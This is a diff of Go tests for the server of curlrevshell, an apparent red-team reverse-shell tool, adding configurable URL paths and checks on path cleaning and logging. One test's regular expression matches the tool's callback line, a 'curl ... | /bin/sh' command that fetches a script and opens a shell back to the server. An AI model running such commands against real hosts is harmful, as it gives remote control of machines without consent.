@@ -5,7 +5,7 @@ package hsrv
  * Tests for hserv.go
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20240926
+ * Last Modified 20241210
  */
 
 import (
@@ -15,15 +15,20 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"log/slog"
 	"maps"
 	"net"
 	"net/http"
+	"reflect"
+	"regexp"
+	"slices"
 	"strings"
 	"sync"
 	"testing"
 
 	"github.com/magisterquis/curlrevshell/internal/iobroker"
 	"github.com/magisterquis/curlrevshell/lib/chanlog"
+	"github.com/magisterquis/curlrevshell/lib/crstemplate"
 	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 )
@@ -83,6 +88,12 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 		cbAddrs,
 		true,
 		false,
+		crstemplate.URLPaths{
+			In:     crstemplate.DefaultURLPathIn,
+			InOut:  crstemplate.DefaultURLPathInOut,
+			Out:    crstemplate.DefaultURLPathOut,
+			Script: crstemplate.DefaultURLPathScript,
+		},
 	)
 	if nil != err {
 		t.Fatalf("Creating server: %s", err)
@@ -192,6 +203,7 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 					CurlFormat+ShellSuffix,
 					s.l.Fingerprint,
 					cbAddrs[0],
+					crstemplate.DefaultURLPathScript,
 				),
 				fmt.Sprintf(
 					CurlFormat+ShellSuffix,
@@ -200,11 +212,13 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 						cbAddrs[1],
 						listenPort,
 					),
+					crstemplate.DefaultURLPathScript,
 				),
 				fmt.Sprintf(
 					CurlFormat+ShellSuffix,
 					s.l.Fingerprint,
 					s.l.Addr().String(),
+					crstemplate.DefaultURLPathScript,
 				),
 			}, "\n") + "\n\n",
 			NoTimestamp: true,
@@ -452,4 +466,205 @@ func TestServer_OneShell(t *testing.T) {
 		{Msg: iobroker.LMDisconnected, Direction: "output"}: 1,
 	})
 	cl.ExpectEmpty(t)
+}
+
+// Make sure we can set the script URL in the output.
+func TestServer_SetScriptURLPath(t *testing.T) {
+	var (
+		_, sl = chanlog.New()
+		want  = "kittens"
+	)
+	s, err := New(
+		sl,
+		"127.0.0.1:0",
+		"",
+		"",
+		nil,
+		nil,
+		nil,
+		"",
+		nil,
+		false,
+		true,
+		crstemplate.URLPaths{
+			In:     "up_In",
+			InOut:  "up_InOut",
+			Out:    "up_Out",
+			Script: want,
+		},
+	)
+	if nil != err {
+		t.Fatalf("New returned error: %s", err)
+	}
+
+	/* Extract our URL bit, hopefully. */
+	if ms := regexp.MustCompile(
+		`curl -sk --pinnedpubkey sha256//[a-zA-Z0-9+/]+= ` +
+			`https://127.0.0.1:\d+/(\S+) \| /bin/sh`,
+	).FindStringSubmatch(s.cbHelp); 2 != len(ms) {
+		t.Errorf("Could not parse callback help line: %q", s.cbHelp)
+	} else if got := ms[1]; got != want {
+		t.Errorf(
+			"Incorrect script path:\n"+
+				"ms[0]: %q\nms[1]: %q\n"+
+				" got: %s\n"+
+				"want: %s",
+			ms[0], ms[1],
+			got,
+			want,
+		)
+	}
+}
+
+func TestNewUnsetURLPath(t *testing.T) {
+	var (
+		_, sl = chanlog.New()
+	)
+	_, err := New(
+		sl,
+		"127.0.0.1:0",
+		"",
+		"",
+		nil,
+		nil,
+		nil,
+		"",
+		nil,
+		false,
+		true,
+		crstemplate.URLPaths{
+			In:    "up_In",
+			InOut: "up_InOut",
+			Out:   "up_Out",
+			/* Script missing. */
+		},
+	)
+	if nil == err {
+		t.Fatalf("Did not get error")
+	}
+	want := "URL path unset: Script"
+	if got := err.Error(); got != want {
+		t.Fatalf(
+			"Incorrect error:\n"+
+				" got: %s\n"+
+				"want: %s",
+			got,
+			want,
+		)
+	}
+}
+
+// Make sure we set ourselves up to debug-log paths correctly.
+func TestSlogAttrsFromURLPaths(t *testing.T) {
+	have := crstemplate.URLPaths{
+		In:     "up_In",
+		InOut:  "up_InOut",
+		Out:    "up_Out",
+		Script: "up_Script",
+	}
+
+	got := slogAttrsFromURLPaths(have)
+
+	want := []slog.Attr{
+		slog.String("In", "up_In"),
+		slog.String("InOut", "up_InOut"),
+		slog.String("Out", "up_Out"),
+		slog.String("Script", "up_Script"),
+	}
+
+	if !slices.EqualFunc(got, want, func(a, b slog.Attr) bool {
+		return a.Equal(b)
+	}) {
+		t.Errorf(
+			"Incorrect attrs returned:\n"+
+				"have: %+v\n"+
+				" got: %v\n"+
+				"want: %v",
+			have,
+			got,
+			want,
+		)
+	}
+}
+
+func TestCleanURLPaths_UnsetField(t *testing.T) {
+	full := crstemplate.URLPaths{
+		In:     "up_In",
+		InOut:  "up_InOut",
+		Out:    "up_Out",
+		Script: "up_Script",
+	}
+	cases := make(map[string]crstemplate.URLPaths) /* want -> have */
+	for _, fn := range []string{"In", "InOut", "Out", "Script"} {
+		have := full
+		reflect.ValueOf(&have).Elem().FieldByName(fn).SetString("")
+		cases[fn] = have
+	}
+
+	for want, have := range cases {
+		t.Run(want, func(t *testing.T) {
+			got := cleanURLPaths(&have)
+			if got != want {
+				t.Errorf(
+					"Incorrect field:\n"+
+						"have: %+v\n"+
+						" got: %s\n"+
+						"want: %s",
+					have,
+					got,
+					want,
+				)
+			}
+		})
+	}
+
+}
+
+func TestCleanURLPaths_Trim(t *testing.T) {
+	have := crstemplate.URLPaths{
+		In:     "in/",
+		InOut:  "/in_out",
+		Out:    "out/",
+		Script: "/////script/////",
+	}
+	t.Run("remove_slashes", func(t *testing.T) {
+		want := crstemplate.URLPaths{
+			In:     "in",
+			InOut:  "in_out",
+			Out:    "out",
+			Script: "script",
+		}
+		got := have
+		if ret := cleanURLPaths(&got); "" != ret {
+			t.Errorf("Unexpected unset field: %s", ret)
+		}
+		if got != want {
+			t.Errorf(
+				"Incorrect cleaned paths:\n"+
+					"have: %#v\n"+
+					" got: %#v\n"+
+					"want: %#v",
+				have,
+				got,
+				want,
+			)
+		}
+	})
+
+	t.Run("empty_field", func(t *testing.T) {
+		have := have
+		have.Out = "////"
+		want := "Out"
+		if got := cleanURLPaths(&have); got != want {
+			t.Errorf(
+				"Missed unset path:\n"+
+					"have: %#v\n"+
+					" got: %#v\n"+
+					"want: %#v",
+				have,
+				got,
+				want,
+			)
+		}
+	})
 }
